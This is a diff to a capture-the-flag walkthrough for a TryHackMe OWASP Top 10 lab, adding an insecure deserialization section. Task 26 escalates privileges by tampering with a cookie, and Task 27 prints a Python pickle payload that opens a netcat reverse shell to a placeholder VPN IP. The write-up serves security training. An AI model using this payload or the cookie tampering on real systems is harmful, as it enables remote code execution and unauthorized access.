@@ -19,7 +19,7 @@ This task just provides a list of all the vulnerabilities that are going to be c
 5. [Broken Access Control](#broken-access-control)
 6. [Security Misconfiguration](#security-misconfiguration)
 7. [Cross-Site Scripting](#cross-site-scripting)
-8. Insecure Deserialization
+8. [Insecure Deserialization](#insecure-deserialization)
 9. Components With Known Vulnerabilities
 10. Insufficient Logging and Monitoring
 
@@ -395,7 +395,7 @@ Cross-Site Scripting (XSS) attack is a type of attack through which you can exec
 2. Stored XSS: When the XXS script is stored directly in the database of the web app.
 3. DOM-Based XSS: Document Object Model (DOM) is helpful to change the document's structure, style and content. DOM XSS are the ones that are in the DOM.
 
-Moving on to the questions, let's deploy yhe machine and go to `http://machine_ip/stored` which would look like:
+Moving on to the questions, let's deploy the machine and go to `http://machine_ip/stored` which would look like:
 
 ![xss_homepage](./.images/xss_homepage.png)
 
@@ -445,6 +445,99 @@ The next few questions are based on stored XSS.
 	We can paste this in the comment box, verify that the text has changed and get the final flag as well.
 
 So, here we complete the XSS challenge as well. And tomorrow I'll add the walkthrough for `Insecure Deserialization`.
+
+Go to [Top](#owasp-top-10)
+
+`July 21, 2020`
+
+## Insecure Deserialization
+In today's challenge, there was a lot of theory along with quite a lot of questions as well which were distributed in 6 tasks. Today's writeup might be a bit too lengthy but worth the knowledge. So, let's begin!!!
+
+### [Task 22] Insecure Deserialization
+Insecure deserialization is a type of attack that takes the benefits of improper serialization and deserialization methods used in a web app. It can lead to attacks ranging from (Denial of Service) DoS to (Remote Code Execution) RCE.
+
+Usually, this vulnerability is not exploited much as it is on a case by case basis. Also, the success of this attack depends strongly on the skills of the attacker.
+
+1.  Who developed the Tomcat application? 
+* The answer to this question can be easily found out by googling `Tomcat developer`. You'll get a 3-word name.
+
+Hint: Add `The` before the 3-word name if your answer is not being accepted.
+
+2. What type of attack that crashes services can be performed with insecure deserialization?
+* This is one of the two attacks that are described above in this task.
+
+### [Task 23] Insecure Deserialization - Objects
+Object-oriented Programming(OOP), as the name suggests the base of this type of programming is the object which is mainly described by two properties it's state and behavior.
+
+It can be defined as the state is values that the object holds whereas the behavior of an object determines the functions that the object performs.
+
+### [Task 24] Insecure Deserialization - Deserialization
+Firstly, serialization is the process of converting objects into a format that can be transmitted through systems. Whereas, deserialization is the reverse process that converts data from is converted format to objects again.
+
+Now, insecure deserialization is the process when malicious data is entered by an attacker and it gets directly processed because of the absence of any kind of filtering or input validation. 
+
+1. What is the name of the base-2 formatting that data is sent across a network as? 
+* The answer to this question can be directly found by googling 'base-2 format'.
+
+### [Task 25] Insecure Deserialization - Cookies
+Cookies are pieces of data that are stored by a website on a user's computer while they are browsing. These cookies help to store the session details of the user. Some cookies are cleared as soon as the browser is closed whereas some might be saved for a longer period.
+
+Cookies can be set using various programming languages like python or PHP. Different websites use different mechanisms to generate cookies.
+
+1. If a cookie had the path of webapp.com/login, what would the URL that the user has to visit be?
+* When cookies are declared, the path along which they are valid is also described. The URL on which the cookie is valid is present in the question itself.
+
+2. What is the acronym for the web technology that Secure cookies work over?
+* HTTP only in its secure mode supports secure cookies.
+
+Hint: What is the name of the secure mode of HTTP.
+
+### [Task 26] Insecure Deserialization - Cookies Practical
+For this task, we first need to browse to the deployed machine's webpage. Then we need to perform all the steps as described on the task which are:
+1. Create an account
+2. Then right-click and select inspect element
+
+Here, we can see all the cookies and their values:
+
+![cookies](./.images/insc_deserial_cookies.png) 
+
+1. 1st flag (cookie value)
+* In the cookies section, we can see a cookie named `sessionid` but it is in base 64 (at it ends with `==`). So, we first need to decode it from base64. From the decoded value, we can find the required flag for this answer.
+
+2. 2nd flag (admin dashboard)
+* Currently we are logged in as a user, to get the admin flag we need to change our account type to 'admin'. This can be done by replacing the'user' with 'admin' in the `userType` cookie in the cookies section.
+	Once done, we can go to `http://machine_ip/admin` and find the flag on the page itself.
+
+### [Task 27] Insecure Deserialization - Remote Code Execution
+As mentioned in task 22, insecure deserialization can lead to lead to RCE, that is what we are going to perform in this attack.
+
+For this task, we need to perform the following task:
+1. First, need to change our account type back to 'user' from previously set 'admin' and go to `/myprofile` page.
+2. There we need to click on `Exchange you vim` and then on `Provide your feedback`.
+3. To get an RCE shell, we need to start a listener. This can be done by executing the netcat command `nc -nvlp 4444`. Here, 4444 is the port on which we are listening.
+4. They have provided us a python script as well, that can help us establish an RCE connection from the target machine which is:
+	```
+	import pickle
+	import sys
+	import base64
+	command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat YOUR_TRYHACKME_VPN_IP 4444 > /tmp/f'
+	class rce(object):
+	    def __reduce__(self):
+	        import os
+	        return (os.system,(command,))
+	print(base64.b64encode(pickle.dumps(rce())))
+	```
+	We need to replace YOUR_TRYHACKME_VPN_IP with our system's local IP address that can be found out using `ifconfig` and would be something like `10.x.x.x`. In this function, a command has been defined which is later used in the `rce() class`. This class is further base64 encoded, which is the value that we would get as output.
+
+	On executing this python script as `python script.py`, we will get byte stream as output from which we need only the data between the single quotes(').
+
+	Now all that we need to do is copy this value to 'encodedPayload' value in the website's cookie section and refresh the page.
+
+	This will execute the rce payload and we will get an RCE shell on our listener. 
+
+	To find where the flag is located, we can use the command: `find / -name flag.txt 2> /dev/null`. We can read the file and find the flag that can be used as the answer to this task's question.
+
+With this, today's challenge finishes. Tomorrow, I'll add the walkthrough for `Components with Known Vulnerabilities` till then keep hacking!!!
 
 Go to [Top](#owasp-top-10)
 
